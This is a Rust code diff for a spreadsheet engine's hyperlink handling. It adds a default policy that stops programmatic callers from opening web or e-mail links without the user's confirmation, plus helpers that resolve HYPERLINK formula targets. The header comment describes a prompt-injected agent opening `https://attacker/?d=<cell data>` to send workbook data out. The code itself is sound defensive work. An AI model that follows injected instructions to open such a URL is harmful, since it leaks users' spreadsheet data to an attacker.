@@ -2,8 +2,52 @@
 //! somebody sent), so it is hostile input: only `http`, `https` and `mailto` ever leave the
 //! workbook for the system; `file:`, `smb:`, UNC paths, custom URL handlers, `javascript:` and
 //! the like are refused. Everything without a scheme stays an in-workbook reference.
+//!
+//! Opening an allowed address also needs the user's say-so (#2181): `link.open` is reachable by
+//! the control channel, the CLI, MCP and workbook scripts, so a prompt-injected agent could open
+//! `https://attacker/?d=<cell data>`. Under the default [`LinkPolicy::Confirm`] the command refuses
+//! external addresses; only the host, after showing the address and getting OK from the user,
+//! opens one through [`crate::Session::open_confirmed_link`], which no command reaches.
 
-use gridcraft_core::RangeRef;
+use gridcraft_core::{CellRef, RangeRef};
+use gridcraft_formula::Expr;
+use gridcraft_model::{Hyperlink, Workbook};
+use serde_json::{Value as Json, json};
+
+use crate::{EngineError, Result, Session, UiRequest};
+
+/// Whether `link.open` may hand an external (`http`/`https`/`mailto`) address to the host without
+/// asking. Set by the host in code, never by a command, so a programmatic caller can't widen it.
+#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
+pub enum LinkPolicy {
+    /// `link.open` refuses external addresses; the user opens them by clicking the link, which
+    /// asks first ([`Session::open_confirmed_link`]). References still navigate.
+    #[default]
+    Confirm,
+    /// The host trusts every caller of this session (an embedding that vets requests itself):
+    /// `link.open` opens allowed addresses directly. Disallowed schemes stay refused.
+    Allow,
+}
+
+/// The error a programmatic `link.open` of a web or e-mail address returns.
+pub const NEEDS_CONFIRMATION: &str = "Web and e-mail links open only when the user clicks them and confirms; a command can't open them.";
+
+impl Session {
+    /// Opens a link the user has just confirmed in the host's "Open Hyperlink" prompt: an allowed
+    /// address goes to the host (`UiRequest::OpenUrl`), a reference selects, anything else is
+    /// refused ([`classify`]). Not a command: only host code that showed the user this exact
+    /// address may call it.
+    pub fn open_confirmed_link(&mut self, target: &str) -> Result<Json> {
+        match classify(target) {
+            LinkKind::Internal(r) => self.execute("edit.goTo", json!({"reference": r.trim_start_matches('#')})),
+            LinkKind::External(u) => {
+                self.ui_requests.push(UiRequest::OpenUrl(u.clone()));
+                Ok(json!({"opened": u}))
+            }
+            LinkKind::Refused(why) => Err(EngineError::Other(why)),
+        }
+    }
+}
 
 /// What a link target is.
 #[derive(Clone, Debug, PartialEq, Eq)]
@@ -42,6 +86,50 @@ pub fn classify(target: &str) -> LinkKind {
     } else {
         LinkKind::Refused(format!("Links of type \"{lower}:\" aren't opened. Only http, https and mailto links are allowed."))
     }
+}
+
+/// The link of a cell: the one stored with it, or, for a cell whose formula is `HYPERLINK(target, …)`,
+/// the target that formula currently evaluates to. A scheme-less web address (`google.com`) is
+/// opened over `https`, as Excel does.
+pub fn cell_link(wb: &Workbook, sheet: usize, at: CellRef) -> Option<Hyperlink> {
+    let sh = wb.sheet(sheet)?;
+    if let Some(h) = sh.hyperlinks.get(&at) {
+        return Some(h.clone());
+    }
+    let expr = sh.cell(at)?.formula.as_ref()?.expr()?;
+    let Expr::Call(name, args) = &expr else { return None };
+    if name != "HYPERLINK" {
+        return None;
+    }
+    let value = gridcraft_calc::evaluate_expr(wb, sheet, at, args.first()?);
+    let target = value.display().trim().to_string();
+    if target.is_empty() || matches!(value, gridcraft_core::Value::Error(_)) {
+        return None;
+    }
+    // a defined name or a table of that spelling (`sales.data`) stays an internal target
+    let internal_name = wb.name(&target, sheet).is_some() || wb.table(&target).is_some();
+    let target = if looks_like_web_address(&target) && !internal_name { format!("https://{target}") } else { target };
+    let external = !matches!(classify(&target), LinkKind::Internal(_));
+    Some(Hyperlink { target, tooltip: None, external })
+}
+
+fn looks_like_web_address(t: &str) -> bool {
+    if t.contains(|c: char| c.is_whitespace() || matches!(c, '\\' | '!')) {
+        return false;
+    }
+    // the host ends at the path, query or fragment (`google.com/x`, `google.com?q=1`, `google.com#top`)
+    let host = t.split(['/', '?', '#']).next().unwrap_or(t);
+    // with an optional port (`example.com:8443`); any other colon is a scheme or a sheet reference
+    let host = match host.split_once(':') {
+        Some((h, port)) if !port.is_empty() && port.len() <= 5 && port.bytes().all(|b| b.is_ascii_digit()) => h,
+        Some(_) => return false,
+        None => host,
+    };
+    let Some((_, tld)) = host.rsplit_once('.') else { return false };
+    tld.len() >= 2
+        && tld.chars().all(|c| c.is_ascii_alphabetic())
+        && !["xlsx", "xlsm", "xlsb", "xls", "csv", "txt", "pdf", "doc", "docx"].contains(&tld.to_ascii_lowercase().as_str())
+        && RangeRef::parse(t).is_none()
 }
 
 #[cfg(test)]
